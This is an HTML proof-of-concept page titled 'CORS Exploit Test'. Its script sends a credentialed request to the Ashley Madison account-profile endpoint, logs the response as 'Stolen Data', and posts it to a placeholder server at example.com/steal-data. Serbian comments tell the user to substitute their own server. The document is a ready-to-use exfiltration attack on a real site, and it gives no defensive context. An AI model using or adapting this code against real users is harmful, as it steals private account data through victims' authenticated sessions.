<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit Test</title>
</head>
<body>
    <h1>CORS Exploit</h1>
    <button id="exploitButton">Send CORS Request</button>
    <script>
        document.getElementById("exploitButton").onclick = function() {
            fetch("https://api.ashleymadison.com/account/manageprofile/", {
                method: "GET",
                credentials: "include"
            })
            .then(response => response.text())
            .then(data => {
                console.log("Stolen Data:", data);
                // PoÅ¡alji ukradene podatke na svoj server
                fetch("https://example.com/steal-data", { // Zameni sa svojim serverom
                    method: "POST",
                    body: JSON.stringify({ stolenData: data }),
                    headers: { "Content-Type": "application/json" }
                });
            })
            .catch(error => console.error("Error:", error));
        };
    </script>
</body>
</html>
